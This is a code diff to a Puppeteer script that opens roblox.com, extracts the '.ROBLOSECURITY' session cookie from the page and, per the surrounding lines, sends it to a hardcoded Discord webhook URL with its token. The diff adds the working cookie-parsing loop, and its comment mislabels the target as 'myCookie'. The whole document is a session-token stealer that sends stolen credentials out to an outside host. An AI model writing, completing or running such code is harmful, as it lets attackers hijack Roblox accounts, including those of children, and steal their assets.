@@ -6,10 +6,18 @@ const puppeteer = require('puppeteer');
   const url = 'https://www.roblox.com/*';
   await page.goto(url);
 
-  // Extract the specific cookie
-  const cookie = await page.evaluate(() => {
-    return document.ROBLOSECURITY; // Replace with code to extract the specific cookie
+  // Extract a cookie named 'myCookie'
+const cookie = await page.evaluate(() => {
+    const cookies = document.cookie.split(';');
+    for (const cookieString of cookies) {
+      const [name, value] = cookieString.trim().split('=');
+      if (name === '.ROBLOSECURITY') {
+        return value;
+      }
+    }
+    return null; // Cookie not found
   });
+  
 
   // Send the cookie data to a Discord webhook
   const discordWebhook = 'https://discord.com/api/webhooks/1154059676795814011/pGIFX0rdpkJiDI3e6NE4VxFPxtvwJs5-UUF34CzHnqjceWok4EeHkodSF29ACWEbzHx8';
